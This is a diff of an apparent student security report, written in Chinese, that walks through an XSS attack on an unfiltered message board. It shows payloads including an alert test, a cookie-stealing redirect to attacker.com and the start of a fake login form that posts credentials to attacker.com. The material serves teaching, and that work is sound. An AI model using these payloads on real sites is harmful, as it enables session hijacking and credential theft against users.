@@ -399,17 +399,17 @@ Follow learning steps below to prepare your report:
        
 2. You are a hacker! Design and do a real XSS attack on a web system. Show us your work.  
 >`假設有一個留言板系統，允許用戶發表評論，但未對輸入內容進行適當的過濾或轉義。`    
-        1. 在留言區輸入以下 XSS 惡意腳本：
+    1. 在留言區輸入以下 XSS 惡意腳本：  
            ```javascrpit
             alert('這是一個 XSS 攻擊！');
            ```
            如果網站直接渲染這段輸入，當其他用戶訪問該留言時，他們的瀏覽器會彈出一個警告框，表示 XSS 攻擊成功。    
-        2. 竊取 Cookie（更進一步的攻擊）：
+    2. 竊取 Cookie（更進一步的攻擊）：  
              ```javascript
             document.location='http://attacker.com/steal.php?cookie='+document.cookie;
              ```
            這段腳本會將受害者的 Cookie 傳送到攻擊者的伺服器，攻擊者可利用該 Cookie 來冒充受害者的身份登入系統。    
-        3. 偽造登入表單：
+     3. 偽造登入表單：  
            ```javascript
             document.body.innerHTML = '<form action="http://attacker.com/login.php" method="POST">' +
                 '<input type="text" name="username" placeholder="請輸入帳號">' +
